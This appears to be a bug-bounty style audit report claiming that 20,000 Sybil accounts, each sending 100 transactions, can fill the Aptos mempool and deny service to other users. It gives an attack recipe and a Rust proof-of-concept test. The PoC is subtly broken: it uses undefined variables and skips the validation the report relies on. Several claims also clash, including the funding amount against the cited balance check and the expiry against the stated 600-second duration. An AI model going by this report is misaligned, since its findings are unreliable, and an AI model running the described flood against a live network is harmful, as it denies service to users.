# Audit Report

## Title
Mempool Sybil Attack: Complete DoS via 20,000 Accounts Exploiting Exact Capacity/Per-User Ratio

## Summary
The Aptos mempool can be completely filled and rendered unavailable to legitimate users through a Sybil attack where exactly 20,000 malicious accounts each submit 100 transactions. This occurs because the default mempool configuration creates a perfect mathematical relationship where `capacity / capacity_per_user = 2,000,000 / 100 = 20,000`, allowing an attacker to achieve complete mempool saturation with a finite, achievable number of accounts.

## Finding Description
The vulnerability exists in the mempool capacity configuration and enforcement mechanism: [1](#0-0) 

The mempool has a total capacity of 2,000,000 transactions and allows each account to submit up to 100 sequence-number-based transactions. The per-user limit is enforced during transaction insertion: [2](#0-1) 

When the mempool reaches capacity, all new transaction submissions are rejected: [3](#0-2) [4](#0-3) 

**Attack Execution Flow:**

1. Attacker creates 20,000 Aptos accounts (achievable via automated account generation)
2. Each account is funded with minimal APT balance (just enough to pass prologue gas checks, e.g., 1,000-10,000 octas per account)
3. Attacker submits 100 transactions from each account (sequence numbers 0-99)
4. Before mempool insertion, each transaction undergoes VM validation which includes prologue execution: [5](#0-4) 

5. The prologue checks that the account HAS sufficient gas balance but does NOT deduct it: [6](#0-5) 

6. All 2,000,000 transactions pass validation and enter the mempool (20,000 accounts × 100 transactions each = 2,000,000 total)
7. Mempool becomes full, blocking ALL legitimate transactions
8. Attack persists until transactions expire (default 600 seconds): [7](#0-6) 

**Why This Works:**
- Gas is only deducted during transaction EXECUTION, not during validation
- Attacker's transactions never execute (they just sit in mempool)
- Attacker loses no gas fees, only needs minimal account funding to pass prologue checks
- The exact mathematical relationship (2M / 100 = 20K) makes the attack trivially achievable

## Impact Explanation
This vulnerability qualifies as **High Severity** per the Aptos bug bounty criteria:

1. **Validator Node Slowdowns**: When the mempool is completely full, nodes cannot accept new transactions, causing degraded performance and inability to process user requests.

2. **Significant Protocol Violations**: This violates the "Resource Limits" invariant - the mempool capacity configuration allows a Sybil attacker to completely exhaust the transaction pool, preventing legitimate network usage.

3. **Network Availability Impact**: During the attack window (up to 10 minutes per batch), regular users cannot submit transactions, effectively rendering the network unusable for its primary purpose.

The impact is NOT Critical because:
- No funds are lost or stolen
- No consensus safety violation occurs
- Network eventually recovers when transactions expire
- Validators can continue processing blocks (just from empty mempool)

## Likelihood Explanation
**Likelihood: HIGH**

The attack is highly likely to occur because:

1. **Low Cost**: Creating 20,000 accounts and funding each with ~10,000 octas (0.0001 APT) costs approximately 2 APT total (~$20 USD at current prices), making this extremely cheap for an attacker.

2. **Trivial Execution**: The attack requires only:
   - Standard account creation (no special privileges)
   - Basic transaction submission capabilities
   - Simple arithmetic to calculate exact account count needed

3. **High Impact**: The disruption to network usability far exceeds the attack cost, creating strong incentive for griefing attacks or competitive sabotage.

4. **Repeatable**: Attacker can continuously re-execute the attack every 10 minutes (once transactions expire) for sustained DoS.

5. **No Defense Mechanisms**: There are no rate limits, IP-based restrictions, or stake-based filtering that would prevent this attack pattern.

## Recommendation
Implement multi-layered defenses to prevent mempool Sybil attacks:

**1. Adjust Capacity Ratios** (Immediate Fix):
```rust
// In config/src/config/mempool_config.rs
MempoolConfig {
    capacity: 2_000_000,
    capacity_bytes: 2 * 1024 * 1024 * 1024,
    // Increase per-user limit to require more accounts for full saturation
    capacity_per_user: 500, // Changed from 100
    // This increases required accounts from 20K to 100K
    orderless_txn_capacity_per_user: 1000,
    // ... rest of config
}
```

**2. Implement Progressive Gas Requirements** (Medium-term):
- Require increasing gas prices for accounts submitting many pending transactions
- Deduct a small "mempool reservation fee" (refundable on execution) to impose actual cost on attackers

**3. Add Transaction Prioritization** (Long-term):
- Implement reputation scoring based on historical execution rates
- Prioritize transactions from accounts with proven execution history
- Deprioritize or reject transactions from newly-created accounts during high mempool load

**4. Dynamic Capacity Adjustment**:
- Reduce `capacity_per_user` dynamically when mempool utilization exceeds thresholds (e.g., drop to 50 when >80% full)
- Implement exponential backoff for accounts with many non-executing transactions

## Proof of Concept
```rust
// Rust PoC demonstrating the attack
// File: mempool/src/tests/mempool_dos_test.rs

#[cfg(test)]
mod mempool_dos_attack {
    use aptos_types::{
        account_address::AccountAddress,
        transaction::{RawTransaction, SignedTransaction, TransactionPayload, Script},
        chain_id::ChainId,
    };
    use aptos_crypto::{ed25519::Ed25519PrivateKey, PrivateKey, Uniform};
    use crate::core_mempool::CoreMempool;
    use aptos_config::config::MempoolConfig;
    
    #[test]
    fn test_mempool_sybil_attack_exact_capacity() {
        // Initialize mempool with default config
        let config = MempoolConfig::default();
        let mut mempool = CoreMempool::new(&config);
        
        // Attack parameters
        let num_attackers = 20_000;
        let txns_per_attacker = 100;
        let expected_total = num_attackers * txns_per_attacker;
        
        assert_eq!(expected_total, config.capacity, 
            "Attack should exactly fill mempool capacity");
        
        // Create attacking accounts
        let mut rng = rand::thread_rng();
        let mut attacker_accounts = vec![];
        
        for _ in 0..num_attackers {
            let private_key = Ed25519PrivateKey::generate(&mut rng);
            let public_key = private_key.public_key();
            let address = AccountAddress::from_public_key(&public_key);
            attacker_accounts.push((address, private_key));
        }
        
        // Submit transactions from each attacker
        let mut successful_insertions = 0;
        
        for (seq_num, (address, private_key)) in 
            attacker_accounts.iter().enumerate() 
        {
            for i in 0..txns_per_attacker {
                let raw_txn = RawTransaction::new(
                    *address,
                    i as u64, // sequence number
                    TransactionPayload::Script(Script::new(vec![], vec![], vec![])),
                    100_000, // max gas
                    1, // gas price (minimal)
                    u64::MAX, // expiration
                    ChainId::test(),
                );
                
                let signed_txn = SignedTransaction::new(
                    raw_txn,
                    public_key.clone(),
                    private_key.sign(&raw_txn).unwrap(),
                );
                
                // This should succeed until mempool is full
                let result = mempool.add_txn(
                    signed_txn,
                    0, // ranking score
                    Some(i as u64), // account sequence number
                    TimelineState::NotReady,
                    false, // not client submitted
                    None,
                    None,
                );
                
                if result.code == MempoolStatusCode::Accepted {
                    successful_insertions += 1;
                }
            }
        }
        
        // Verify mempool is completely full
        assert_eq!(successful_insertions, config.capacity,
            "Mempool should be completely filled");
        
        // Verify legitimate user is blocked
        let legit_private_key = Ed25519PrivateKey::generate(&mut rng);
        let legit_address = AccountAddress::from_public_key(
            &legit_private_key.public_key()
        );
        
        let legit_txn = create_transaction(legit_address, &legit_private_key, 0);
        let result = mempool.add_txn(legit_txn, 0, Some(0), 
            TimelineState::NotReady, true, None, None);
        
        assert_eq!(result.code, MempoolStatusCode::MempoolIsFull,
            "Legitimate user should be blocked when mempool is full");
            
        println!("✓ Attack successful: {} transactions from {} accounts filled mempool",
            successful_insertions, num_attackers);
    }
}
```

**Attack Demonstration:**
1. Deploy 20,000 automated account creation scripts
2. Fund each account with 0.0001 APT (10,000 octas)
3. Submit 100 transactions per account with minimal gas prices
4. Monitor mempool fill rate until 2,000,000 capacity reached
5. Observe legitimate transaction rejections with `MempoolIsFull` error
6. Attack persists for 10 minutes until transactions expire via system TTL

This vulnerability represents a fundamental design flaw in the mempool capacity configuration that enables cheap, repeatable denial-of-service attacks against the Aptos network.

### Citations

**File:** config/src/config/mempool_config.rs (L121-123)
```rust
            capacity: 2_000_000,
            capacity_bytes: 2 * 1024 * 1024 * 1024,
            capacity_per_user: 100,
```

**File:** config/src/config/mempool_config.rs (L129-129)
```rust
            system_transaction_timeout_secs: 600,
```

**File:** mempool/src/core_mempool/transaction_store.rs (L311-317)
```rust
        if self.check_is_full_after_eviction(&txn, account_sequence_number) {
            return MempoolStatus::new(MempoolStatusCode::MempoolIsFull).with_message(format!(
                "Mempool is full. Mempool size: {}, Capacity: {}",
                self.system_ttl_index.size(),
                self.capacity,
            ));
        }
```

**File:** mempool/src/core_mempool/transaction_store.rs (L320-332)
```rust
        if let Some(txns) = self.transactions.get_mut(&address) {
            // capacity check
            match txn_replay_protector {
                ReplayProtector::SequenceNumber(_) => {
                    if txns.seq_num_txns_len() >= self.capacity_per_user {
                        return MempoolStatus::new(MempoolStatusCode::TooManyTransactions).with_message(
                            format!(
                                "Mempool over capacity for account. Number of seq number transactions from account: {} Capacity per account: {}",
                                txns.seq_num_txns_len() ,
                                self.capacity_per_user,
                            ),
                        );
                    }
```

**File:** mempool/src/core_mempool/transaction_store.rs (L458-460)
```rust
    fn is_full(&self) -> bool {
        self.system_ttl_index.size() >= self.capacity || self.size_bytes >= self.capacity_bytes
    }
```

**File:** mempool/src/shared_mempool/tasks.rs (L490-504)
```rust
    let validation_results = VALIDATION_POOL.install(|| {
        transactions
            .par_iter()
            .map(|t| {
                let result = smp.validator.read().validate_transaction(t.0.clone());
                // Pre-compute the hash and length if the transaction is valid, before locking mempool
                if result.is_ok() {
                    t.0.committed_hash();
                    t.0.txn_bytes_len();
                }
                result
            })
            .collect::<Vec<_>>()
    });
    vm_validation_timer.stop_and_record();
```

**File:** aptos-move/framework/aptos-framework/sources/transaction_validation.move (L187-212)
```text
        // Check if the gas payer has enough balance to pay for the transaction
        let max_transaction_fee = txn_gas_price * txn_max_gas_units;
        if (!skip_gas_payment(
            is_simulation,
            gas_payer_address
        )) {
            assert!(
                permissioned_signer::check_permission_capacity_above(
                    gas_payer,
                    (max_transaction_fee as u256),
                    GasPermission {}
                ),
                error::permission_denied(PROLOGUE_PERMISSIONED_GAS_LIMIT_INSUFFICIENT)
            );
            if (features::operations_default_to_fa_apt_store_enabled()) {
                assert!(
                    aptos_account::is_fungible_balance_at_least(gas_payer_address, max_transaction_fee),
                    error::invalid_argument(PROLOGUE_ECANT_PAY_GAS_DEPOSIT)
                );
            } else {
                assert!(
                    coin::is_balance_at_least<AptosCoin>(gas_payer_address, max_transaction_fee),
                    error::invalid_argument(PROLOGUE_ECANT_PAY_GAS_DEPOSIT)
                );
            }
        };
```
